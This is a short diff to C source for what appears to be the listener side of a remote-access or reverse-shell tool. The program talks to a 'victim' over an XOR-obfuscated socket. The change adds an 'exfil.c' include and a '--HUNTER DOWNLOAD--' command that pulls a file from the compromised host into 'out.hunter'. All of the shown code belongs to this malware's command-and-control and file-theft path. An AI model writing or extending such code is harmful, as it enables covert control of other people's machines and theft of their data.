@@ -5,6 +5,7 @@
 #include <ctype.h>
 #include <string.h>
 #include <unistd.h>
+#include "exfil.c"
 
 extern char* key;
 extern int keylen;
@@ -106,11 +107,21 @@ void *Socket_Reader(){
     fflush(NULL);
     while (a.kill == 0 && (n = read(a.dest, buffer, MAXBUF)) > 0) {
 	xorbuffer = XOR(buffer, key, n, keylen);
+	if(strcmp(xorbuffer, "--HUNTER DOWNLOAD--") == 0){
+		char* xorconfirm = XOR("OK", key, 2, keylen);
+		write(a.dest, xorconfirm, 2);
+		free(xorconfirm);
+		recvfile("out.hunter", a.dest, key);
+		continue;
+
+	}
+
         if (write(STDOUT_FILENO, xorbuffer, n) < 0)  // writes data from victim fd to stdout
             printf("Error in function write()\n");
         fflush(NULL);
         //printf("%d>", a.dest);
         fflush(NULL);
+	free(xorbuffer);
     }
 
     if (n < 0)
